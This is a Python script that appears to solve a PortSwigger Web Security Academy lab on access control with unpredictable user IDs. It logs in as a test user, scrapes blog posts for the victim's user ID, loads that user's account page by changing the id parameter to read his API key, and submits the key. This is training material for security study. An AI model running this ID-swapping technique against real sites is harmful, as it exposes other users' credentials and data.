# Lab: User ID controlled by request parameter, with unpredictable user IDs
# https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids

import requests
import re

session = requests.Session()
base_url = "https://ID.web-security-academy.net"

# Login with wiener:peter
login_data = {"username": "wiener", "password": "peter"}
response = session.post(f"{base_url}/login", data=login_data)

# crawling through blog posts to find profile of carlos
carlos_uid = None
for post_id in range(1, 10):
    blog_url = f"{base_url}/post?postId={post_id}"
    response = session.get(blog_url)
    match = re.search(r"href=['\"]/blogs\?userId=([a-f0-9\-]+)['\"]>\s*carlos\s*</a>", response.text, re.IGNORECASE)
    if match:
        carlos_uid = match.group(1)
        print(f"[+] Found Carlos's user ID: {carlos_uid}")
        break

# accessing API key of Carlos
account_url = f"{base_url}/my-account?id={carlos_uid}"
resp = session.get(account_url)
match = re.search(r"Your API Key is: ([A-Za-z0-9]+)", resp.text)
if not match:
    print("[-] API key not found in account page")
    exit()

api_key = match.group(1)
print(f"[+] Found API Key: {api_key}")


#submit API key
submit_url = f"{base_url}/submitSolution"
data = {"answer": api_key}
submit_response = session.post(submit_url, data=data)
print("API Key submitted!")
